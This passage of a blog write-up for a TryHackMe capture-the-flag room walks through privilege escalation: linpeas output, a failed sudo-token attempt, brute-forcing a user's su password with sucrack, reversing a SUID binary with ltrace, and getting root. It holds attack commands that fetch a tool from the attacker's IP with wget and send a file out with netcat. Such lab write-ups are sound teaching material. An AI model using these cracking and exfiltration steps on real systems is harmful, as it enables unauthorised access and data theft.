+<p>Now, let&rsquo;s get <strong>linpeas</strong> to find priv esc vectors.
+<img src="https://i.imgur.com/yQfXRti.png" alt="Getting linpeas to find priv esc vectors"  /></p>
+<p>Here&rsquo;s the stuff it marked:</p>
+<pre><code>[+] Unmounted file-system?
+[i] Check if you can mount umounted devices                                             
+/dev/disk/by-id/dm-uuid-LVM-2vWU08UHAxgr0umysQPoxtHSdFdx70llz4fwL1Q9vtLr2IL1fPcyJc851c7izh0w    /       ext4    defaults        0 0                                             
+/dev/disk/by-uuid/069d6843-2a0d-4a97-b8cd-948aa75be772  /boot   ext4    defaults       0 0
+</code></pre><p>^Nothing interesting</p>
+<pre><code>[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                                 
+gdm-password Not Found                                                                  
+gnome-keyring-daemon Not Found                                                          
+lightdm Not Found                                                                       
+vsftpd process found (dump creds from memory as root)                                   
+apache2 process found (dump creds from memory as root)
+sshd Not Found
+
+</code></pre><p>^Nothing interesting</p>
+<pre><code>[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                              
+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                            
+gdb was found in PATH
+</code></pre><p>^Interesting</p>
+<pre><code>[+] Searching ssl/ssh files
+ListenAddress 127.0.0.1                                                                                                          
+PermitRootLogin no
+ChallengeResponseAuthentication no
+UsePAM yes
+Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+ --&gt; /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+</code></pre><p>^False positive</p>
+<pre><code>[+] Passwords inside pam.d
+/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin  
+</code></pre><p>^Useless (?)</p>
+<h3 id="31-sudo-token-vulnerability-fail">3.1. Sudo Token Vulnerability (Fail)</h3>
+<p>Requirements to escalate privileges:</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> You already have a shell as user &ldquo;sampleuser&rdquo;</li>
+<li><input disabled="" type="checkbox"> &ldquo;sampleuser&rdquo; have used sudo to execute something in the last 15mins (by default that&rsquo;s the duration of the sudo token that allows to use sudo without introducing any password)</li>
+<li><input checked="" disabled="" type="checkbox"> cat /proc/sys/kernel/yama/ptrace_scope is 0</li>
+<li><input checked="" disabled="" type="checkbox"> gdb is accessible (you can be able to upload it)</li>
+</ul>
+<blockquote>
+<p>You can temporarily enable ptrace_scope with <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> or permanently modifying <code>/etc/sysctl.d/10-ptrace.conf</code> and setting <code>kernel.yama.ptrace_scope = 0</code></p>
+</blockquote>
+<p><a class="link" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens"  target="_blank" rel="noopener"
+    >Source for the exploit</a></p>
+<p>But I can&rsquo;t edit <code>ptrace_scope</code> or check the point 2. Dead end.</p>
+<h3 id="32-lateral-escalation-password-cracking">3.2. Lateral Escalation: Password Cracking</h3>
+<p>Since we do not have <code>ssh</code>, we can try bruteforcing <code>sudo su</code>. We can use the wordlist we saw during steganography bruteforcing.</p>
+<p>Download the sucrack files. <a class="link" href="http://archive.ubuntu.com/ubuntu/pool/universe/s/sucrack/sucrack_1.2.3-4_amd64.deb"  target="_blank" rel="noopener"
+    >.deb from here</a>.</p>
+<p>Transfer this again.</p>
+<pre><code>www-data@ubuntu:/tmp$ wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb
+wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb
+--2021-06-03 05:01:53--  http://10.17.8.184/sucrack_1.2.3-4_amd64.deb
+Connecting to 10.17.8.184:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16670 (16K) [application/vnd.debian.binary-package]
+Saving to: 'sucrack_1.2.3-4_amd64.deb'
+
+sucrack_1.2.3-4_amd 100%[===================&gt;]  16.28K  74.2KB/s    in 0.2s    
+
+2021-06-03 05:01:53 (74.2 KB/s) - 'sucrack_1.2.3-4_amd64.deb' saved [16670/16670]
+
+www-data@ubuntu:/tmp$ dpkg -x sucrack_1.2.3-4_amd64.deb sucrack
+dpkg -x sucrack_1.2.3-4_amd64.deb sucrack
+</code></pre><p>I tried with the wordlist we have aleady, but it was taking too long. According to THM Discord, it should not. Maybe I&rsquo;m doing something wrong?</p>
+<p>I realised that <code>123adana</code> is a prefix we saw for both the above passwords. Maybe the password is also starting from that? I looked it in the list and there was only one match. Did not work.</p>
+<p>How about pre-pending <code>123adana</code> to all the words?</p>
+<p><code>sed 's/^/123adana/' /tmp/wordlist.txt &gt; newlist.txt</code></p>
+<p>And I tried it again &hellip;</p>
+<p>After a long long time, I finally get</p>
+<pre><code>www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
+&lt;k/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
+password is: 123adanasubaru
+www-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey
+Password: 123adana{mmm tasty}
+</code></pre><h3 id="33-reverse-engineering-binary">3.3. Reverse Engineering: Binary</h3>
+<pre><code>hakanbey@ubuntu:~$ find  / -type f -perm -u=s 2&gt;/dev/null
+/bin/fusermount
+/bin/su
+/bin/umount
+/bin/mount
+/bin/ping
+/usr/local/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/arping
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/binary
+/usr/bin/at
+/usr/bin/newgrp
+/usr/sbin/pppd
+/usr/sbin/exim4
+</code></pre><p><code>/usr/bin/binary</code> looks odd.</p>
+<pre><code>hakanbey@ubuntu:~$ /usr/bin/binary
+I think you should enter the correct string here ==&gt;hi
+pkill: killing pid 1545 failed: Operation not permitted
+pkill: killing pid 4209 failed: Operation not permitted
+pkill: killing pid 4412 failed: Operation not permitted
+pkill: killing pid 4414 failed: Operation not permitted
+...
+</code></pre><p>Move binary to the place where we can get it from ftp :)
+<code>hakanbey@ubuntu:/var/www/subdomain$ cp /usr/bin/binary .</code></p>
+<p>Give all the permissions:
+<code>hakanbey@ubuntu:/var/www/subdomain$ chmod 777  binary </code></p>
+<p>Get the binary on your machine.</p>
+<pre><code>ftp&gt; get binary
+local: binary remote: binary
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for binary (12984 bytes).
+226 Transfer complete.
+12984 bytes received in 0.00 secs (93.8069 MB/s)
+</code></pre><p>Doing <code>strings</code> on the binary, we get the following interesting information.</p>
+<pre><code>I think you should enter the correct string here ==&gt;
+/root/hint.txt
+Hint! : %s
+/root/root.jpg
+Unable to open source!
+/home/hakanbey/root.jpg
+Copy /root/root.jpg ==&gt; /home/hakanbey/root.jpg
+Unable to copy!
+</code></pre><p>So we need something more, let&rsquo;s do <code>ltrace</code>.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ltrace ./binary
+strcat(&quot;war&quot;, &quot;zone&quot;)                                                          = &quot;warzone&quot;
+strcat(&quot;warzone&quot;, &quot;in&quot;)                                                        = &quot;warzonein&quot;
+strcat(&quot;warzonein&quot;, &quot;ada&quot;)                                                     = &quot;warzoneinada&quot;
+strcat(&quot;{woah is this it?}&quot;, &quot;na&quot;)                                                   = &quot;{very very nice}&quot;
+printf(&quot;I think you should enter the cor&quot;...)                                  = 52
+__isoc99_scanf(0x55e7ade00edd, 0x7fff37c28a60, 0, 0I think you should enter the correct string here ==&gt;warzoneinada
+)                           = 1
+strcmp(&quot;{hidden}&quot;, &quot;{redacted}&quot;)                                       = -110
+strcat(&quot;pki&quot;, &quot;l&quot;)                                                             = &quot;pkil&quot;
+strcat(&quot;pkil&quot;, &quot;l&quot;)                                                            = &quot;pkill&quot;
+strcat(&quot;pkill&quot;, &quot; -9&quot;)                                                         = &quot;pkill -9&quot;
+strcat(&quot;pkill -9&quot;, &quot; -t&quot;)                                                      = &quot;pkill -9 -t&quot;
+strcat(&quot;pkill -9 -t&quot;, &quot; pts&quot;)                                                  = &quot;pkill -9 -t pts&quot;
+strcat(&quot;pkill -9 -t pts&quot;, &quot;/0&quot;)                                                = &quot;pkill -9 -t pts/0&quot;
+system(&quot;pkill -9 -t pts/0&quot; &lt;no return ...&gt;
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed&gt; )                                                         = 256
++++ exited (status 0) +++
+
+</code></pre><p>Putting in the last word works! Let&rsquo;s do it on the target system.</p>
+<pre><code>hakanbey@ubuntu:~$ ./usr/bin/binary
+./usr/bin/binary
+bash: ./usr/bin/binary: No such file or directory
+hakanbey@ubuntu:~$ /usr/bin/binary
+/usr/bin/binary
+I think you should enter the correct string here ==&gt;{yee haww}
+Hint! : Hexeditor 00000020 ==&gt; ???? ==&gt; /home/hakanbey/Desktop/root.jpg (CyberChef)
+
+Copy /root/root.jpg ==&gt; /home/hakanbey/root.jpg
+hakanbey@ubuntu:~$ ls
+ls
+binary   Documents  Music     Public    Templates  Videos
+Desktop  Downloads  Pictures  root.jpg  user.txt   website
+hakanbey@ubuntu:~$ 
+</code></pre><p>Okay &hellip; time for image handling</p>
+<h3 id="34-image-handling">3.4. Image Handling</h3>
+<p>Copy the image using netcat, on you machine. Follow the steps:</p>
+<ol>
+<li>Send the file to an IP with port specified.</li>
+</ol>
+<pre><code>hakanbey@ubuntu:~$ nc 10.17.8.184 3333 &lt; root.jpg
+nc 10.17.8.184 3333 &lt; root.jpg
+</code></pre><ol start="2">
+<li>Listen and redirect.</li>
+</ol>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ nc -lnvp 3333 &gt; img.jpg
+listening on [any] 3333 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.68.111] 35942
+^C
+</code></pre><p>Looking at the mentioned offset, we get:
+<img src="https://i.imgur.com/I37Gg1G.png" alt="hex code for the image that helps us do privesc"  /></p>
+<p>Using the hint from the room: <code>From HEX, To Base85</code>, I got the password :D</p>
+<pre><code>root@ubuntu:~# cat root.txt
+cat root.txt
+THM{wowowowowow}
+</code></pre><p>System compromised!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+            <a href="/tags/cms/">cms</a>
+        
+            <a href="/tags/steganography/">steganography</a>
+        
+            <a href="/tags/phpmyadmin/">phpmyadmin</a>
+        
+            <a href="/tags/brute-forcing/">brute-forcing</a>
+        
+    </section>
+
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/ha-joker-ctf/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg" loading="lazy" data-key="" data-hash="https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HA Joker CTF</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/agent-sudo/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/NoIdF01.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/NoIdF01.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Agent Sudo</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/biohazard/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/d7dVxxR.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/d7dVxxR.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Biohazard</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/blog/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/rP25U0x.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/rP25U0x.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Blog</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/brooklyn-nine-nine-all-paths/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/6XcDCc8.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/6XcDCc8.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Brooklyn Nine Nine (All Paths)</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Tanishq Chaudhary
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
